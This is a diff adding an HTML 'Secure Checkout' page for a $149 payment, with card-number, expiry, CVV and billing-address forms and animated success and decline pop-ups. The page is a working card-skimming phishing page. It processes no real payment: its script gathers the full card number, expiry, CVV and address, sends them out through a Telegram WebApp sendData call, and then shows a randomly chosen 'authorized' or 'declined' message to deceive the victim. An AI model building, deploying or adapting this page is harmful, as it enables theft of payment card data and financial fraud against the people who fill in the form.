@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout</title>
+    <!-- Canvas Confetti Library for Success Animation -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #0b0f19;
+            --card-bg: #131b2e;
+            --border-color: #2a374a;
+            --text-color: #e2e8f0;
+            --accent-blue: #3b82f6;
+            --success-green: #10b981;
+            --error-red: #ef4444;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; overflow-x: hidden; }
+        .checkout-container { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; width: 100%; max-width: 480px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); position: relative; }
+        
+        .order-summary { background: #1e293b; border: 1px solid var(--border-color); border-radius: 10px; padding: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .order-summary div span { display: block; font-size: 12px; color: #94a3b8; }
+        .order-summary div strong { font-size: 16px; color: #f8fafc; }
+        .order-amount { font-size: 20px; font-weight: bold; color: var(--success-green); }
+
+        .form-group { margin-bottom: 14px; position: relative; }
+        label { display: block; font-size: 11px; margin-bottom: 5px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
+        .input-wrapper { display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 8px; background: #0f172a; transition: all 0.2s ease; }
+        .input-wrapper:focus-within { border-color: var(--accent-blue); box-shadow: 0 0 0 3px rgba(59,130,246,0.2); }
+        input { width: 100%; padding: 12px 14px; background: transparent; border: none; color: var(--text-color); font-size: 14px; outline: none; }
+        
+        .is-valid { border-color: var(--success-green) !important; box-shadow: 0 0 0 2px rgba(16,185,129,0.2) !important; }
+        .is-invalid { border-color: var(--error-red) !important; box-shadow: 0 0 0 2px rgba(239,68,68,0.2) !important; }
+        .error-msg { font-size: 11px; color: var(--error-red); margin-top: 4px; display: none; }
+
+        .row { display: flex; gap: 12px; }
+        .row .form-group { flex: 1; }
+        
+        .card-logo-tag { font-size: 11px; font-weight: bold; color: var(--accent-blue); display: none; margin-right: 12px; text-transform: uppercase; background: rgba(59,130,246,0.15); padding: 3px 8px; border-radius: 4px; border: 1px solid var(--accent-blue); }
+
+        .btn-submit { width: 100%; background-color: var(--accent-blue); color: white; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .btn-submit:hover { background-color: #2563eb; }
+        .btn-pay { background-color: var(--success-green); }
+        .btn-pay:hover { background-color: #059669; }
+
+        .spinner { width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #addressSection { display: none; margin-top: 15px; border-top: 1px dashed var(--border-color); padding-top: 15px; }
+        .step-title { font-size: 14px; font-weight: bold; color: #f8fafc; margin-bottom: 12px; }
+
+        /* Exact Match Popup Modal (Like Reference Image) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 8, 17, 0.85); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(10px); }
+        .status-card { background: #ffffff; border-radius: 24px; width: 90%; max-width: 360px; padding: 40px 25px 30px 25px; text-align: center; color: #333; position: relative; box-shadow: 0 25px 60px rgba(0,0,0,0.7); transform: scale(0.6); opacity: 0; transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .modal-overlay.active .status-card { transform: scale(1); opacity: 1; }
+        
+        .status-icon-outer { width: 90px; height: 90px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px auto; }
+        .status-icon-inner { width: 65px; height: 65px; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 30px; font-weight: bold; }
+        
+        /* Success Theme */
+        .success-theme .status-icon-outer { background: #e6f9f0; box-shadow: 0 0 20px rgba(16, 185, 129, 0.3); }
+        .success-theme .status-icon-inner { background: #10b981; }
+        .success-theme .status-btn { background: #10b981; }
+
+        /* Error Theme */
+        .error-theme .status-icon-outer { background: #ffebeb; box-shadow: 0 0 20px rgba(239, 68, 68, 0.3); }
+        .error-theme .status-icon-inner { background: #ef4444; }
+        .error-theme .status-btn { background: #ef4444; }
+
+        .status-title { font-size: 22px; font-weight: 800; margin-bottom: 8px; color: #1e293b; }
+        .status-desc { font-size: 13px; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
+        .status-btn { width: 100%; padding: 14px; border: none; border-radius: 12px; color: white; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.8px; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-container" id="mainContainer">
+    <div class="order-summary">
+        <div>
+            <span>Action</span>
+            <strong>Fill your card information</strong>
+        </div>
+        <div class="order-amount">$149.00 USD</div>
+    </div>
+
+    <form id="checkoutForm" onsubmit="event.preventDefault();">
+        
+        <!-- STEP 1: CARD DETAILS -->
+        <div id="cardSection">
+            <div class="step-title">1. Payment Details</div>
+
+            <div class="form-group">
+                <label>Card Number</label>
+                <div class="input-wrapper" id="cardNumWrap">
+                    <input type="text" id="cardNumber" placeholder="4532 •••• •••• ••••" maxlength="23" oninput="handleCardInput(this)">
+                    <span id="cardBrandLabel" class="card-logo-tag"></span>
+                </div>
+                <div class="error-msg" id="cardError">Invalid card or Luhn check failed.</div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Expiry (MM/YY)</label>
+                    <div class="input-wrapper" id="expiryWrap">
+                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" oninput="handleExpiryInput(this)">
+                    </div>
+                    <div class="error-msg" id="expiryError">Invalid month/year (e.g. 12/29).</div>
+                </div>
+                <div class="form-group">
+                    <label>CVV / CVC</label>
+                    <div class="input-wrapper" id="cvvWrap">
+                        <input type="password" id="cvv" placeholder="•••" maxlength="4" oninput="handleCvvInput(this)">
+                    </div>
+                    <div class="error-msg" id="cvvError">Invalid CVV length.</div>
+                </div>
+            </div>
+
+            <button type="button" class="btn-submit" onclick="proceedToAddress()">
+                Proceed to Address Details ➔
+            </button>
+        </div>
+
+        <!-- STEP 2: ADDRESS DETAILS -->
+        <div id="addressSection">
+            <div class="step-title">2. Billing Address</div>
+
+            <div class="form-group">
+                <label>Country</label>
+                <div class="input-wrapper"><input type="text" id="countryInput" placeholder="Enter Country" required></div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>State / Province</label>
+                    <div class="input-wrapper"><input type="text" id="stateInput" placeholder="Enter State" required></div>
+                </div>
+                <div class="form-group">
+                    <label>City</label>
+                    <div class="input-wrapper"><input type="text" id="cityInput" placeholder="Enter City" required></div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Street Address</label>
+                <div class="input-wrapper"><input type="text" id="streetAddress" placeholder="Enter Street Address" required></div>
+            </div>
+
+            <div class="form-group">
+                <label>ZIP / Postal Code (Max 10 chars)</label>
+                <div class="input-wrapper" id="zipWrap">
+                    <input type="text" id="zipCode" placeholder="Postal Code" maxlength="10" oninput="handleZipInput(this)" required>
+                </div>
+                <div class="error-msg" id="zipError">Invalid postal code.</div>
+            </div>
+
+            <button type="button" class="btn-submit btn-pay" id="payBtn" onclick="processFinalPayment()">
+                <span id="btnText">Pay $149.00 USD</span>
+                <div class="spinner" id="btnSpinner"></div>
+            </button>
+        </div>
+
+    </form>
+</div>
+
+<!-- POPUP MODALS (SUCCESS / DECLINE) -->
+<div class="modal-overlay" id="statusModal">
+    <div class="status-card success-theme" id="successCard" style="display: none;">
+        <div class="status-icon-outer"><div class="status-icon-inner">✓</div></div>
+        <div class="status-title">Congratulations!</div>
+        <div class="status-desc">Your payment of $149.00 USD has been authorized successfully.</div>
+        <button class="status-btn" onclick="closeModal()">DONE</button>
+    </div>
+
+    <div class="status-card error-theme" id="declineCard" style="display: none;">
+        <div class="status-icon-outer"><div class="status-icon-inner">✕</div></div>
+        <div class="status-title">Sorry, man...</div>
+        <div class="status-desc">The next time you must be lucky. Transaction declined by issuer bank.</div>
+        <button class="status-btn" onclick="closeModal()">TRY AGAIN</button>
+    </div>
+</div>
+
+<script>
+    let currentCardBrand = "";
+    let requiredCardLength = 16;
+    let isCardValid = false, isExpiryValid = false, isCvvValid = false, isZipValid = false;
+
+    function handleCardInput(input) {
+        let val = input.value.replace(/\D/g, '');
+        let wrap = document.getElementById('cardNumWrap');
+        let errorMsg = document.getElementById('cardError');
+        let brandLabel = document.getElementById('cardBrandLabel');
+
+        if (val.length >= 1) {
+            let firstDigit = val[0];
+            let firstTwo = parseInt(val.substring(0, 2), 10) || 0;
+            let firstFour = parseInt(val.substring(0, 4), 10) || 0;
+            requiredCardLength = 16;
+
+            if (firstDigit === '4') { currentCardBrand = "VISA"; }
+            else if ((firstTwo >= 51 && firstTwo <= 55) || (firstFour >= 2221 && firstFour <= 2720)) { currentCardBrand = "MASTERCARD"; }
+            else if (firstTwo === 34 || firstTwo === 37) { currentCardBrand = "AMEX"; requiredCardLength = 15; }
+            else if (firstTwo === 36 || firstTwo === 38 || (firstFour >= 3000 && firstFour <= 3059)) { currentCardBrand = "DINERS"; requiredCardLength = 14; }
+            else { currentCardBrand = "CARD"; }
+
+            brandLabel.textContent = currentCardBrand;
+            brandLabel.style.display = 'block';
+
+            if (val.length > requiredCardLength) val = val.substring(0, requiredCardLength);
+            input.value = val.match(/.{1,4}/g)?.join(' ') || val;
+
+            if (val.length === requiredCardLength) {
+                if (luhnCheck(val)) {
+                    wrap.classList.add('is-valid'); wrap.classList.remove('is-invalid'); errorMsg.style.display = 'none'; isCardValid = true;
+                } else {
+                    wrap.classList.add('is-invalid'); wrap.classList.remove('is-valid'); errorMsg.style.display = 'block'; isCardValid = false;
+                }
+            } else {
+                wrap.classList.remove('is-valid', 'is-invalid'); errorMsg.style.display = 'none'; isCardValid = false;
+            }
+        } else {
+            input.value = val; currentCardBrand = ""; brandLabel.style.display = 'none';
+            wrap.classList.remove('is-valid', 'is-invalid'); errorMsg.style.display = 'none'; isCardValid = false;
+        }
+        validateCvvFormat();
+    }
+
+    function luhnCheck(numStr) {
+        let cleanStr = numStr.replace(/\D/g, '');
+        let sum = 0, shouldDouble = false;
+        for (let i = cleanStr.length - 1; i >= 0; i--) {
+            let digit = parseInt(cleanStr.charAt(i), 10);
+            if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
+            sum += digit; shouldDouble = !shouldDouble;
+        }
+        return (sum % 10 === 0 && sum > 0);
+    }
+
+    function handleExpiryInput(input) {
+        let val = input.value.replace(/\D/g, '').substring(0, 4);
+        let wrap = document.getElementById('expiryWrap');
+        let errorMsg = document.getElementById('expiryError');
+
+        if (val.length >= 2) {
+            let mm = parseInt(val.substring(0, 2), 10);
+            let d = new Date(), curY = d.getFullYear() % 100, curM = d.getMonth() + 1;
+            
+            if (mm < 1 || mm > 12) {
+                wrap.classList.add('is-invalid'); wrap.classList.remove('is-valid'); errorMsg.style.display = 'block'; isExpiryValid = false;
+            } else {
+                if (val.length === 4) {
+                    let yy = parseInt(val.substring(2, 4), 10);
+                    if (yy < curY || yy > curY + 15 || (yy === curY && mm < curM)) {
+                        wrap.classList.add('is-invalid'); wrap.classList.remove('is-valid'); errorMsg.style.display = 'block'; isExpiryValid = false;
+                    } else {
+                        wrap.classList.add('is-valid'); wrap.classList.remove('is-invalid'); errorMsg.style.display = 'none'; isExpiryValid = true;
+                    }
+                } else {
+                    wrap.classList.remove('is-invalid', 'is-valid'); errorMsg.style.display = 'none'; isExpiryValid = false;
+                }
+                input.value = val.substring(0, 2) + '/' + val.substring(2);
+                return;
+            }
+        } else {
+            wrap.classList.remove('is-valid', 'is-invalid'); errorMsg.style.display = 'none'; isExpiryValid = false;
+        }
+        input.value = val;
+    }
+
+    function handleCvvInput(input) {
+        let reqLen = (currentCardBrand === "AMEX") ? 4 : 3;
+        input.value = input.value.replace(/\D/g, '').substring(0, reqLen);
+        validateCvvFormat();
+    }
+
+    function validateCvvFormat() {
+        let cvv = document.getElementById('cvv').value;
+        let wrap = document.getElementById('cvvWrap');
+        let errorMsg = document.getElementById('cvvError');
+        let reqLen = (currentCardBrand === "AMEX") ? 4 : 3;
+
+        if (cvv.length === reqLen) {
+            wrap.classList.add('is-valid'); wrap.classList.remove('is-invalid'); errorMsg.style.display = 'none'; isCvvValid = true;
+        } else if (cvv.length > 0 && cvv.length < reqLen) {
+            wrap.classList.add('is-invalid'); wrap.classList.remove('is-valid'); errorMsg.style.display = 'block'; isCvvValid = false;
+        } else {
+            wrap.classList.remove('is-valid', 'is-invalid'); errorMsg.style.display = 'none'; isCvvValid = false;
+        }
+    }
+
+    function handleZipInput(input) {
+        let val = input.value.trim();
+        let wrap = document.getElementById('zipWrap');
+        let errorMsg = document.getElementById('zipError');
+        if (val.length >= 3 && val.length <= 10) {
+            wrap.classList.add('is-valid'); wrap.classList.remove('is-invalid'); errorMsg.style.display = 'none'; isZipValid = true;
+        } else {
+            wrap.classList.add('is-invalid'); wrap.classList.remove('is-valid'); errorMsg.style.display = 'block'; isZipValid = false;
+        }
+    }
+
+    function proceedToAddress() {
+        if (!isCardValid || !isExpiryValid || !isCvvValid) {
+            alert("Please enter valid card details first.");
+            return;
+        }
+        document.getElementById('cardSection').style.display = 'none';
+        document.getElementById('addressSection').style.display = 'block';
+    }
+
+    function processFinalPayment() {
+        let country = document.getElementById('countryInput').value;
+        let state = document.getElementById('stateInput').value;
+        let city = document.getElementById('cityInput').value;
+        let street = document.getElementById('streetAddress').value;
+        let zip = document.getElementById('zipCode').value;
+
+        if (!country || !state || !city || !street || !isZipValid) {
+            alert("Please fill all address fields properly.");
+            return;
+        }
+
+        let payBtn = document.getElementById('payBtn');
+        let spinner = document.getElementById('btnSpinner');
+        let btnText = document.getElementById('btnText');
+
+        payBtn.disabled = true;
+        spinner.style.display = 'block';
+        btnText.textContent = "Processing...";
+
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            payBtn.disabled = false;
+            btnText.textContent = "Pay $149.00 USD";
+
+            // Data payload to send to telegram
+            let payload = JSON.stringify({
+                card: document.getElementById('cardNumber').value,
+                expiry: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value,
+                brand: currentCardBrand,
+                address: { country, state, city, street, zip }
+            });
+
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.sendData(payload);
+            }
+
+            // RANDOM SUCCESS OR DECLINE (50-50 chance or customize)
+            let isSuccess = Math.random() < 0.6; // 60% success, 40% decline
+            let modal = document.getElementById('statusModal');
+            modal.style.display = 'flex';
+            setTimeout(() => modal.classList.add('active'), 10);
+
+            if (isSuccess) {
+                document.getElementById('successCard').style.display = 'block';
+                document.getElementById('declineCard').style.display = 'none';
+                confetti({ particleCount: 150, spread: 80, origin: { y: 0.6 } });
+            } else {
+                document.getElementById('successCard').style.display = 'none';
+                document.getElementById('declineCard').style.display = 'block';
+            }
+        }, 1500);
+    }
+
+    function closeModal() {
+        let modal = document.getElementById('statusModal');
+        modal.classList.remove('active');
+        setTimeout(() => { modal.style.display = 'none'; }, 300);
+    }
+</script>
+
+</body>
+</html>
